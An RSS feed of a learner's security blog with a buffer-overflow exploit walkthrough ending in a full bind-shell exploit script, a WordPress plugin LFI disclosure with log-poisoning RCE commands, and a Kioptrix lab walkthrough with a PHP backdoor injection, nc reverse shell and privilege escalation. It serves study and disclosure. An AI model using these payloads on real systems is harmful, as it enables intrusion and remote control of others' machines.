<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Exploit &#8211; Graeme Robinson&#039;s blog</title>
	<atom:link href="/category/exploit/feed/" rel="self" type="application/rss+xml" />
	<link>/</link>
	<description>A place for my thoughts when I was starting to break into the information security feild</description>
	<lastBuildDate>Fri, 20 Jul 2018 21:48:34 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.6.2</generator>
	<item>
		<title>Learning more about buffer overflow exploits</title>
		<link>/learning-more-about-buffer-overflow-exploits/</link>
					<comments>/learning-more-about-buffer-overflow-exploits/#comments</comments>
		
		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
		<pubDate>Fri, 20 Jul 2018 21:48:34 +0000</pubDate>
				<category><![CDATA[Buffer Overflow]]></category>
		<category><![CDATA[Immunity]]></category>
		<category><![CDATA[mona.py]]></category>
		<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">/?p=342</guid>

					<description><![CDATA[Preamble After passing OSCP, I took a bit of a break from studying, but I&#8217;ve decided to get back on it and start learning more about exploit development, since that was part of the OSCP course that I found very &#8230; <a href="/learning-more-about-buffer-overflow-exploits/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
										<content:encoded><![CDATA[<h1>Preamble</h1>
<p>After passing OSCP, I took a bit of a break from studying, but I&#8217;ve decided to get back on it and start learning more about exploit development, since that was part of the OSCP course that I found very interesting.</p>
<p>I had heard about the <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">series of tutorials on the corelan blog</a> so I started to work through the first one and in doing so I hit a few problems and learned a few interesting things that I thought might be useful to others.</p>
<p>After mentioning to a colleague that I was learning about exploit development, they mentioned that <a href="https://www.fuzzysecurity.com/tutorials/expDev/1.html">fuzzysecurity has some good exploit development tutorials</a> too, so I will check those out in parallel.</p>
<p>Anyway, let&#8217;s get on with my experiences while following corelan&#8217;s &#8220;<a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">Exploit writing tutorial part 1</a>&#8220;:</p>
<h1>Setting up the environment</h1>
<p>The first thing I had to do was get a Windows XP VM up and running, install the vulnerable version of &#8220;Easy RM to MP3 Converter&#8221; and create an m3u file that would cause the application to crash. I&#8217;ll explain how I got a copy of Windows XP running in a VM for free (I could probably get this through my MSDN subscription, but that&#8217;s not necessary) and how I downloaded the app and created the m3u exploit file (hint: I didn&#8217;t use the perl script in corelan&#8217;s article).</p>
<h2>Windows XP VM</h2>
<p>Microsoft offers <a href="https://www.microsoft.com/en-gb/download/details.aspx?id=8002">a Windows XP VM as a free download</a>. It is intended to be run in Windows 7, providing a way of running programs that run on XP, but won&#8217;t on Windows 7, for example 16 bit executables. This &#8220;feature&#8221; is called &#8220;XP Mode&#8221;.</p>
<p>The download is an executable. If we inspect the exe file (using something like 7zip, don&#8217;t execute it!), we can extract the file &#8220;sources/xpm&#8221;, then rename it to xpm.cab and extract the &#8220;VirtualXPVHD&#8221; file from it. Rename this file to &#8220;VirtualXP.VHD&#8221; and then create a new VM in virtual box and use this file as the hard disk. It may be worth taking a snapshot before you start the VM because it will not be licensed and will stop working after 30 days. If you take a snapshot, you can revert it and get 30 days use out of it again.</p>
<h2>Easy RM to MP3 Converter</h2>
<p>I downloaded this from <a href="https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe">here on exploit-db</a>. The link comes from <a href="https://www.exploit-db.com/exploits/9186/">this exploit page</a>.</p>
<h2>Creating m3u that causes crash</h2>
<p>I use both python and perl at work, but I have more experience in python and I prefer it, so I installed python (I installed version 2.7.15 because it&#8217;s the latest v2.x and it supports Windows XP, where the latest v3.x doesn&#8217;t support Windows XP) and ported the code from perl to python. This is what I used to create the first m3u file from the article:</p>
<pre style="padding-left: 30px;">#!/usr/bin/env python


with open("crash.m3u", "w") as file:
    file.write("A" * 10000)


print "m3u File Created successfully"</pre>
<p>It doesn&#8217;t cause the crash, but if the number of &#8220;A&#8221;s is changed to 30000 then it will.</p>
<h1>Debugging</h1>
<p>I decided to use Immunity debugger because I think it has a nicer interface and can do more than Windbg. I also added mona.py (also from corelan) and used some of it&#8217;s features to make the process easier. The manual for mona.py which includes instructions to download and install it <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">can be found here</a>.</p>
<h1>Finding the offset to overwrite EIP</h1>
<p>This section details finding the exact place in the m3u file that we need to put the bytes that we want to end up in EIP. It starts off by splitting the 30000 bytes into two chunks; the first one is 25000 and the second one is 5000. Then after determining that the bytes from the second (smaller) chunk are placed in EIP, a more accurate method is used to find the exact bytes.<strong> I tried to skip this step, which gave me incorrect results and it took me quite some time to figure out why. </strong>I&#8217;ll explain what tripped me up:</p>
<p>The article explains how to use a tool from the Metasploit framework to generate a pattern where the exact offset of a string of bytes can be identified. Incidentally, this syntax for this tool has changed, and it has moved in Kali (the successor to Backtrack, which it looks like is being used in this article). In Kali, it can be found at /usr/share/metasploit-framework/tools/exploit/pattern_create.rb but there is a symlink to it at /usr/bin/msf-pattern_create, so it can be run by just typing &#8220;msf-pattern_create&#8221;. I decided that since I have mona.py installed, I would just use that tool since it meant I didn&#8217;t need to start my Kali VM. I used mona.py to create a 30000 byte pattern using the command &#8220;!mona pc 30000&#8221; in Immunity debugger. A pattern is output to the log, but it&#8217;s truncated, so it can be copied from &#8220;C:\Program Files\Immunity Inc\Immunity Debugger\pattern.txt&#8221;.</p>
<p>I stuck this pattern in my python file and created a new m3u like this:</p>
<pre>#!/usr/bin/env python


PATTERN = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1...Ml1Ml2Ml3Ml4Ml5Ml6Ml7Ml8Ml9"


with open("crash.m3u", "w") as file:
file.write(PATTERN) 


print "m3u File Created successfully"</pre>
<p>and when I opened that file with Immunity attached, I saw the bytes &#8220;48386B48&#8221; in EIP. I used mona.py to locate those bytes (using the command &#8220;!mona po 48386B48&#8221;) in the pattern and it said they were at offset 5784. When I changed the bytes at that position in the m3u file, it didn&#8217;t make a difference to EIP shown in Immunity when I reloaded the file. I eventually discovered that the pattern created by Metasploit and mona is only 20,280 (26*26*10*3) bytes long and after that it starts again. The byte pattern in EIP was indeed the same as at offset 5784, but it was also at offset 26064 (5784 + 20280) and those are the bytes that made it into EIP! I should have just followed the steps, but I did end up learning the limitations of that pattern generator and offset locator.</p>
<h1>\xCC AKA INT3 aka &#8220;break&#8221;</h1>
<p>The article skips over what this mysterious \xCC byte does. A quick google search led me to <a href="https://en.wikipedia.org/wiki/INT_(x86_instruction)#INT_3">an article on wikipedia</a> that explained that it&#8217;s special single byte interrupt instruction for use by debuggers, so when the program hits this instruction, Immunity will pause execution so we can inspect the state of the registers and memory. Very useful!</p>
<h1>Finding a JMP ESP instruction</h1>
<p>The article covers how to find a JMP ESP instruction using Windbg, but not Immunity. I turned to mona.py again and used the command:</p>
<pre>!mona f -type instr -s "jmp esp" -o -cp nonull</pre>
<p>&#8230;which showed me some location in the log, but also wrote them to &#8220;C:\Program Files\Immunity Inc\Immunity Debugger\find.txt&#8221;</p>
<h2>Creating my own Shellcode using Metasploit</h2>
<p>I tried creating my own shellcode to spawn calc using &#8220;msfvenom -p windows/exec -f python&#8221;, but it didn&#8217;t work. Looking in the debugger, I could see that my Shellcode was being truncated. This was because my shellcode contained at least one null byte (\x00), but that wasn&#8217;t the only byte that caused the shellcode to become truncated, as I found out when I removed the null bytes. The article didn&#8217;t make it clear, but I would have to specify which bytes to exclude from the shellcode. Of course, I could use the the alpha_upper encoder which is shown later in the article, but I wanted to have a small shellcode. To find the bad bytes, I wanted to create a sequence of bytes 00 to FF and put them in the m3u file. I created the sequence of bytes again using mona.py. The command was &#8220;!mona ba&#8221; and mona would output to the log, but also to &#8220;C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.txt&#8221; and I could stick that in my python script so that it would be written in the m3u file. Every time I saw a byte cause truncation or get swapped with another byte, I would add that to the list of bad chars for msfvenom to avoid. I ended up actually only finding two bad bytes; \x00 \x0A. To generate my own shellcode that spawned calc, I ran this command:</p>
<pre>msfvenom -p windows/exec -f python -b "\x00\x0a" CMD=calc</pre>
<h1>Completed python script to create bind shell exploit</h1>
<pre>#!/usr/bin/env python

# msfvenom -p windows/shell_bind_tcp -e x86/alpha_upper -f python EXITFUNC=seh
buf = ""
buf += "\x89\xe3\xda\xdc\xd9\x73\xf4\x5e\x56\x59\x49\x49\x49"
buf += "\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
buf += "\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
buf += "\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
buf += "\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
buf += "\x4a\x49\x4b\x4c\x4d\x38\x4b\x32\x55\x50\x35\x50\x35"
buf += "\x50\x55\x30\x4b\x39\x4b\x55\x36\x51\x39\x50\x52\x44"
buf += "\x4c\x4b\x36\x30\x46\x50\x4c\x4b\x46\x32\x44\x4c\x4c"
buf += "\x4b\x50\x52\x32\x34\x4c\x4b\x33\x42\x57\x58\x34\x4f"
buf += "\x4e\x57\x50\x4a\x56\x46\x50\x31\x4b\x4f\x4e\x4c\x57"
buf += "\x4c\x35\x31\x33\x4c\x35\x52\x56\x4c\x47\x50\x4f\x31"
buf += "\x58\x4f\x54\x4d\x55\x51\x58\x47\x5a\x42\x4c\x32\x31"
buf += "\x42\x51\x47\x4c\x4b\x36\x32\x52\x30\x4c\x4b\x31\x5a"
buf += "\x57\x4c\x4c\x4b\x50\x4c\x52\x31\x53\x48\x4a\x43\x37"
buf += "\x38\x53\x31\x48\x51\x46\x31\x4c\x4b\x36\x39\x31\x30"
buf += "\x33\x31\x58\x53\x4c\x4b\x57\x39\x52\x38\x4b\x53\x37"
buf += "\x4a\x47\x39\x4c\x4b\x47\x44\x4c\x4b\x33\x31\x49\x46"
buf += "\x56\x51\x4b\x4f\x4e\x4c\x39\x51\x38\x4f\x54\x4d\x43"
buf += "\x31\x48\x47\x47\x48\x4d\x30\x52\x55\x4b\x46\x33\x33"
buf += "\x43\x4d\x5a\x58\x57\x4b\x53\x4d\x47\x54\x34\x35\x5a"
buf += "\x44\x50\x58\x4c\x4b\x30\x58\x47\x54\x33\x31\x59\x43"
buf += "\x43\x56\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x46\x38\x35"
buf += "\x4c\x33\x31\x39\x43\x4c\x4b\x44\x44\x4c\x4b\x35\x51"
buf += "\x58\x50\x4c\x49\x30\x44\x47\x54\x36\x44\x31\x4b\x31"
buf += "\x4b\x45\x31\x30\x59\x31\x4a\x46\x31\x4b\x4f\x4b\x50"
buf += "\x51\x4f\x31\x4f\x51\x4a\x4c\x4b\x45\x42\x5a\x4b\x4c"
buf += "\x4d\x51\x4d\x42\x48\x47\x43\x36\x52\x43\x30\x55\x50"
buf += "\x32\x48\x42\x57\x32\x53\x57\x42\x31\x4f\x31\x44\x42"
buf += "\x48\x50\x4c\x54\x37\x37\x56\x34\x47\x4b\x4f\x4e\x35"
buf += "\x48\x38\x4a\x30\x43\x31\x45\x50\x45\x50\x56\x49\x49"
buf += "\x54\x56\x34\x30\x50\x33\x58\x57\x59\x4d\x50\x32\x4b"
buf += "\x35\x50\x4b\x4f\x59\x45\x42\x4a\x53\x38\x51\x49\x36"
buf += "\x30\x5a\x42\x4b\x4d\x57\x30\x46\x30\x57\x30\x30\x50"
buf += "\x32\x48\x5a\x4a\x44\x4f\x59\x4f\x4b\x50\x4b\x4f\x48"
buf += "\x55\x5a\x37\x33\x58\x44\x42\x43\x30\x54\x51\x31\x4c"
buf += "\x4d\x59\x4d\x36\x52\x4a\x44\x50\x51\x46\x46\x37\x32"
buf += "\x48\x39\x52\x49\x4b\x46\x57\x55\x37\x4b\x4f\x39\x45"
buf += "\x30\x57\x45\x38\x58\x37\x5a\x49\x37\x48\x4b\x4f\x4b"
buf += "\x4f\x38\x55\x46\x37\x43\x58\x34\x34\x5a\x4c\x57\x4b"
buf += "\x4d\x31\x4b\x4f\x4e\x35\x31\x47\x5a\x37\x45\x38\x32"
buf += "\x55\x42\x4e\x50\x4d\x43\x51\x4b\x4f\x48\x55\x33\x58"
buf += "\x42\x43\x32\x4d\x32\x44\x43\x30\x4b\x39\x4a\x43\x51"
buf += "\x47\x31\x47\x51\x47\x56\x51\x4c\x36\x42\x4a\x34\x52"
buf += "\x51\x49\x30\x56\x4d\x32\x4b\x4d\x45\x36\x49\x57\x57"
buf += "\x34\x57\x54\x47\x4c\x33\x31\x53\x31\x4c\x4d\x47\x34"
buf += "\x37\x54\x44\x50\x48\x46\x45\x50\x51\x54\x31\x44\x30"
buf += "\x50\x56\x36\x50\x56\x51\x46\x51\x56\x51\x46\x30\x4e"
buf += "\x50\x56\x56\x36\x51\x43\x56\x36\x53\x58\x54\x39\x38"
buf += "\x4c\x57\x4f\x4c\x46\x4b\x4f\x48\x55\x4b\x39\x4d\x30"
buf += "\x50\x4e\x50\x56\x37\x36\x4b\x4f\x46\x50\x52\x48\x43"
buf += "\x38\x4c\x47\x45\x4d\x45\x30\x4b\x4f\x49\x45\x4f\x4b"
buf += "\x4b\x4e\x44\x4e\x47\x42\x4b\x5a\x53\x58\x4e\x46\x4a"
buf += "\x35\x4f\x4d\x4d\x4d\x4b\x4f\x38\x55\x57\x4c\x54\x46"
buf += "\x53\x4c\x45\x5a\x4b\x30\x4b\x4b\x4b\x50\x42\x55\x54"
buf += "\x45\x4f\x4b\x31\x57\x54\x53\x52\x52\x52\x4f\x42\x4a"
buf += "\x35\x50\x50\x53\x4b\x4f\x4e\x35\x41\x41"

with open(r"c:\documents and settings\administrator\desktop\mal.m3u", "w") as file:
    file.write(26064 * "A")
    file.write("\x2a\xb2\xd4\x01") # JMP ESP
    file.write("\x90" * 25) # NOP * 25
    file.write(buf)

print "Done"</pre>
]]></content:encoded>
					
					<wfw:commentRss>/learning-more-about-buffer-overflow-exploits/feed/</wfw:commentRss>
			<slash:comments>1</slash:comments>
		
		
			</item>
		<item>
		<title>I discovered a vulnerability in a wordpress plugin</title>
		<link>/i-discovered-a-vulnerability-in-a-wordpress-plugin/</link>
					<comments>/i-discovered-a-vulnerability-in-a-wordpress-plugin/#respond</comments>
		
		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
		<pubDate>Sun, 29 Apr 2018 11:12:59 +0000</pubDate>
				<category><![CDATA[Exploit]]></category>
		<category><![CDATA[exploit-db]]></category>
		<category><![CDATA[Web Server]]></category>
		<guid isPermaLink="false">/?p=333</guid>

					<description><![CDATA[I was reviewing some code recently that had been written by someone that I knew and I found an LFI vulnerability using directory traversal. I explained it to them and they fixed it, but not quite well enough, so I &#8230; <a href="/i-discovered-a-vulnerability-in-a-wordpress-plugin/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
										<content:encoded><![CDATA[<p>I was reviewing some code recently that had been written by someone that I knew and I found an LFI vulnerability using directory traversal. I explained it to them and they fixed it, but not quite well enough, so I showed them again how it could be exploited in a different way, and this time the fixed it properly. Hopefully they learnt a lesson on the way that they should always sanitise user input.</p>
<p>It was thrilling to discover an exploit like this myself so I decided to search public code repositories for obviously vulnerable lines of code. I found a wordpress plugin called simple fields that had a LFI vulnerability in due to unsanitised user input. It can even lead to RFI or RCE depending on how the web server is configured (e.g. allow_url_include is enabled or of apache logs can be poisoned and loaded). It actually looks like it was fixed in later versions because the lines containing the vulnerability were commented out, but old versions my still be installed on some sites.</p>
<p>I submitted the vulnerability to the exploit database and <a href="https://www.exploit-db.com/exploits/44425/">it has been published here</a>.</p>
<p>I knew how the vulnerability should work, but I needed to verify it, so I had to set up an environment to test it. The vulnerability requires version 0.2 &#8211; 0.3.5 of simple fields and it must be hosted on a system running 5.3.3 or older php. It&#8217;s pretty hard to install 5.3.3 or older php these days. There won&#8217;t be a php package of that version in any default repositories. The easiest way I found of installing it was to install camp 1.7.2 on Linux (I used Ubuntu 16.0.4)</p>
<p>PHP &lt;5.3.4 is required because the exploit relies on the ability to inject a null byte to terminate a string before the script expects it to be and this was fixed in PHP 5.3.4</p>
<p>The vulnerable line of code in simple_fields.php is:</p>
<pre>require( $_GET["wp_abspath"] . './wp-blog-header.php' );</pre>
<h1>Proof of concept LFI:</h1>
<pre>http://host/wordpress/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00</pre>
<p>This works because the null byte terminates the string, so the trailing &#8220;./wp-blog-header.php&#8221; is ignored.</p>
<h1>Proof of concept RCE:</h1>
<pre>$ echo "&lt;?system(\$_GET['cmd'])?&gt;"|nc host 80
$ curl "http://host/wordpress/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=../../../../../logs/access_log%00&amp;cmd=id"</pre>
<p>This works because we first poison the apache logs with some php that will run whatever command was submitted as the value for &#8220;cmd&#8221; in the query string, and then we use the LFI to include the poisoned log and the command we want to run.</p>
<p>This vulnerability is admittedly not that likely to show up in the wild since it requires an old version of php, and an old version of a plugin that isn&#8217;t even supported any more, but it could be present on some old systems.</p>
]]></content:encoded>
					
					<wfw:commentRss>/i-discovered-a-vulnerability-in-a-wordpress-plugin/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Kioptrix 2014</title>
		<link>/kioptrix-2014/</link>
					<comments>/kioptrix-2014/#comments</comments>
		
		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
		<pubDate>Thu, 12 Oct 2017 20:48:43 +0000</pubDate>
				<category><![CDATA[Exploit]]></category>
		<category><![CDATA[Information Security]]></category>
		<category><![CDATA[Penetration Test]]></category>
		<category><![CDATA[PHP]]></category>
		<category><![CDATA[Shell]]></category>
		<category><![CDATA[Uncategorized]]></category>
		<category><![CDATA[Unix]]></category>
		<category><![CDATA[Web Server]]></category>
		<guid isPermaLink="false">/?p=312</guid>

					<description><![CDATA[My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, &#8230; <a href="/kioptrix-2014/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
										<content:encoded><![CDATA[<p>My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, so I decided to try a few Vulnhub VMs. <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">This article</a> has a list of 10 that I will be trying, the first of which is <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix 2014</a>.</p>
<p>There are already walkthroughs all over the web, so I don&#8217;t feel like I&#8217;m giving away any spoilers here. I&#8217;m mostly documenting it for my own notes, but of course it can be used for hints if you&#8217;re going to give it a try.</p>
<p>I wanted to run in in VirtualBox, which requires the use of the extra &#8220;kiop2014_fix.zip&#8221; file as wall as the VMDK from the main kiop2014.tar.bz2</p>
<p>After starting the VM, I had to find the system&#8217;s IP address, so I ran netdiscover and it was quickly found. To find the open ports and identify the services, I ran nmap:</p>
<pre>root@kali:~# nmap [IP-REDACTED] -sV

Starting Nmap 7.40 ( https://nmap.org/ ) at 2017-10-11 15:59 EDT
Nmap scan report for kioptrix2014.lan ([IP-REDACTED])
Host is up (0.00044s latency).
Not shown: 997 filtered ports
PORT STATE SERVICE VERSION
22/tcp closed ssh
<strong>80/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</strong>
<strong>8080/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</strong>
MAC Address: 08:00:27:DC:55:1C (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds</pre>
<p>Opening a web browser on port 8080 shows a 403 forbidden error message. Nothing too interesting in the response. The page returned on port 80 is more interesting though&#8230; When rendered, it&#8217;s just a heading that says &#8220;It works!&#8221;, but the source includes a commented out &lt;meta refresh&gt; that would redirect the browser to http://[IP-REDACTED]/pChart2.1.3/examples/index.php.</p>
<p>Initially, I thought I could inject some PHP in here. For example if I went to the sandbox and  changed my chart title to <strong>-&#8220;.shell_exec(&#8220;whoami&#8221;).&#8221;-</strong> then clicked the &#8220;Show code&#8221; button, it showed me that one line of code that would run would be</p>
<pre>$myPicture-&gt;drawText(350,25,"-".shell_exec("whoami")."-",$TextSettings);</pre>
<p>but when I clicked &#8220;Render picture&#8221;, the title was<strong>-&#8220;.shell_exec(&#8220;whoami&#8221;).&#8221;-</strong>, so it must have escaped it somehow when it really made the picture. Damn.</p>
<p>Next thing to try is looking for a known exploit for pChart:</p>
<pre>root@kali:~# searchsploit pchart
--------------------------------------------- ----------------------------------
 Exploit Title | Path
 | (/usr/share/exploitdb/platforms/)
--------------------------------------------- ----------------------------------
pChart 2.1.3 - Multiple Vulnerabilities | php/webapps/31173.txt
--------------------------------------------- ----------------------------------</pre>
<p>That txt file suggests that I can read any file on the system that the account running apache can read using a maliciously crafted url, for example http://[IP-REDACTED]/examples/index.php?Action=View&amp;Script=/etc/passwd</p>
<p>Interestingly, we can see how this exploit works by examining the first line of index.php, which can be seen by visiting http://[IP-REDACTED]/pChart2.1.3/examples/index.php?Action=View&amp;Script=index.php , which is:</p>
<pre>&lt;?php if ( isset($_GET["Action"])) { $Script = $_GET["Script"]; highlight_file($Script); exit(); } ?&gt;</pre>
<p>. We don&#8217;t even really need a value set for &#8220;Action&#8221;; http://[IP-REDACTED]/pChart2.1.3/examples/index.php?<strong>Action</strong>&amp;Script=index.php works just as well.</p>
<p>Anyway, there&#8217;s not much of great interest that this account can access, but perhaps we can find out why we are seeing a 403 forbidden response when we connect to port 8080&#8230;</p>
<p><a href="https://www.freebsd.org/doc/handbook/network-apache.html">The apache config file on FreeBSD is located in /usr/local/etc/apache2x/httpd.conf</a>, (on this system, since it&#8217;s apache 2.2, we should replace the &#8220;x&#8221; with a &#8220;2&#8221;) so we&#8217;ll look at that with http://[IP-REDACTED]/pChart2.1.3/examples/index.php?Action&amp;Script=/usr/local/etc/apache22/httpd.conf and at the bottom of the file is:</p>
<pre>SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser

&lt;VirtualHost *:8080&gt;
    DocumentRoot /usr/local/www/apache22/data2

&lt;Directory "/usr/local/www/apache22/data2"&gt;
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
&lt;/Directory&gt;</pre>
<p>This tells us that port 8080 is serving files from /usr/local/www/apache22/data2, and that requests will only be allowed if the user agent starts with &#8220;Mozilla/4.0 Mozilla4_browser&#8221; . See https://httpd.apache.org/docs/2.4/mod/mod_setenvif.html and http://httpd.apache.org/docs/current/mod/mod_access_compat.html#allow for more details of how that works.</p>
<p>Changing our user agent to &#8220;Mozilla/4.0 Mozilla4_browser_NOT REALLY!&#8221; makes apache respond to our requests to port 80, and the response says that there is a directory called phptax. This shows us a very ugly and dated web application that I clicked around, but couldn&#8217;t find anything interesting, so I used searchsploit again:</p>
<pre>root@kali:~# searchsploit phptax
------------------------------------------------------------------ ----------------------------------
 Exploit Title | Path
 | (/usr/share/exploitdb/platforms/)
------------------------------------------------------------------ ----------------------------------
PhpTax - pfilez Parameter Exec Remote Code Injection (Metasploit) | php/webapps/21833.rb
phptax 0.8 - Remote Code Execution | php/webapps/21665.txt
PhpTax 0.8 - File Manipulation (newvalue) / Remote Code Execution | php/webapps/25849.txt
------------------------------------------------------------------ ----------------------------------</pre>
<p>The second one looks interesting, it basically says that we can get remote code execution because user input is not sanitised before being used in php&#8217;s exec() function. I&#8217;ll confirm this works by writing a <a href="/single-line-php-script-to-gain-shell/">single line php backdoor file</a> by visiting http://[IP-REDACTED]:8080/phptax/drawimage.php?pfilez=xxx;echo &#8220;&lt;?php echo shell_exec(\$_GET[&#8216;e&#8217;].&#8217; 2&gt;%261&#8242;);?&gt;&#8221;&gt;backdoor.php;&amp;pdf=make in my browser, then http://[IP-REDACTED]:8080/backdoor.php?e=whoami to make sure it worked. It did, and now I can execute shell commands <strong>and see the output</strong></p>
<p>It would be really nice to have a remote shell. I tried using &#8220;nc &lt;IP&gt; &lt;PORT&gt; -e /bin/sh&#8221;, but that didn&#8217;t work and &#8220;nc -h&#8221; showed why; -e is for specifying an IPsec policy (whatever that means) on this version of nc. We&#8217;ll have to try something else; I remember some time ago that I was able to use a named fifo pipe in order to get a shell with nc. This command worked for me to connect to a netcat listener:</p>
<pre>mkfifo pipe;nc [IP ADDR] [PORT]&lt;pipe|/bin/sh&gt;pipe 2&gt;pipe;rm pipe</pre>
<p>Running &#8220;uname -r&#8221; tells us that we&#8217;re on a FreeBSD 9.0 system. Let&#8217;s try to get root. Back to searchsploit:</p>
<pre>root@kali:~# searchsploit -t FreeBSD 9
------------------------------------------------------------------------- ----------------------------------
 Exploit Title | Path
 | (/usr/share/exploitdb/platforms/)
------------------------------------------------------------------------- ----------------------------------
FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20810.c
FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20811.cpp
FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | windows/dos/20812.c
FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20813.c
FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | windows/dos/20814.c
FreeBSD 9.1 ftpd - Remote Denial of Service | freebsd/dos/24450.txt
FreeBSD mcweject 0.9 (eject) - Buffer Overflow Privilege Escalation | bsd/local/3578.c
BSD/OS 2.1 / DG/UX 4.0 / Debian 0.93 / Digital UNIX 4.0 B / FreeBSD 2.1. | unix/local/19203.c
FreeBSD 9.0 &lt; 9.1 mmap/ptrace - Privilege Escalation | freebsd/local/26368.c
FreeBSD 9 - Address Space Manipulation Privilege Escalation (Metasploit) | freebsd/local/26454.rb
FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation | freebsd/local/28718.c
FreeBSD/x86 - rev connect_ recv_ jmp_ return results Shellcode (90 bytes | freebsd_x86/shellcode/13265.c
FreeBSD/x86 - Rortbind Reverse 127.0.0.1:8000 /bin/sh Shellcode (89 byte | freebsd_x86/shellcode/13267.asm
------------------------------------------------------------------------- ----------------------------------</pre>
<p>26368 looks promising, let&#8217;s send it to the remote machine. I ran this on my attacking machine:</p>
<pre>searchsploit -m 26368;nc -vnlp 6666 &lt;26368.c</pre>
<p>then ran this on the remote system:</p>
<pre>nc 192.168.23.120 6666 &gt;26368.c</pre>
<p>and after a few seconds, I hit CTRL+C to close the nc session. Not I have the exploit on the FreeBSD system, so I can compile it and run it:</p>
<pre>gcc 26368.c -o 26368
./26368
whoami
root</pre>
<p>We&#8217;ve got root! Inside root&#8217;s home directory is a nice txt file with some interesting information that we can read using cat</p>
<p>I recently learned that <a href="http://www.kioptrix.com/blog/farewell-loneferret/">the guy that made this VM (Steven “loneferret” McElrea) passed away a couple of months ago</a>. I&#8217;m grateful for the time he put into making this VM and my thoughts go out to his family.</p>
]]></content:encoded>
					
					<wfw:commentRss>/kioptrix-2014/feed/</wfw:commentRss>
			<slash:comments>1</slash:comments>
		
		
			</item>
		<item>
		<title>Am I officially a white hat hacker now!?</title>
		<link>/am-i-officially-a-white-hat-hacker-now/</link>
					<comments>/am-i-officially-a-white-hat-hacker-now/#respond</comments>
		
		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
		<pubDate>Tue, 16 Aug 2016 14:31:43 +0000</pubDate>
				<category><![CDATA[Exploit]]></category>
		<category><![CDATA[Information Security]]></category>
		<category><![CDATA[White Hat]]></category>
		<guid isPermaLink="false">/?p=278</guid>

					<description><![CDATA[A while ago, while developing a geocaching app for pebble smartwatches called &#8220;Watch Caching&#8221;, I noticed a bug that could have security implications, so I reported it to Pebble using the whitehat guidelines set out by theme It took them a &#8230; <a href="/am-i-officially-a-white-hat-hacker-now/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
										<content:encoded><![CDATA[<p>A while ago, while developing a geocaching app for pebble smartwatches called <a href="https://apps.getpebble.com/applications/571f2701bfdfeab1cf000004">&#8220;Watch Caching&#8221;</a>, I noticed a bug that could have security implications, so I reported it to Pebble using <a href="https://www.pebble.com/legal/white_hat/">the whitehat guidelines set out by theme</a></p>
<p>It took them a while, but they eventually got back to me and agreed that it was a security vulnerability and wanted to offer me a significant financial reward, as well as put me in the <a href="https://www.pebble.com/legal/white_hat/hall_of_fame">Pebble White Hat Hall of Fame</a></p>
<p>This also took a while to come to fruition, but they did hold true to their word and sent me the money, followed a few days later by my name being added to the <a href="https://www.pebble.com/legal/white_hat/hall_of_fame">Pebble White Hat Hall of Fame</a>!</p>
]]></content:encoded>
					
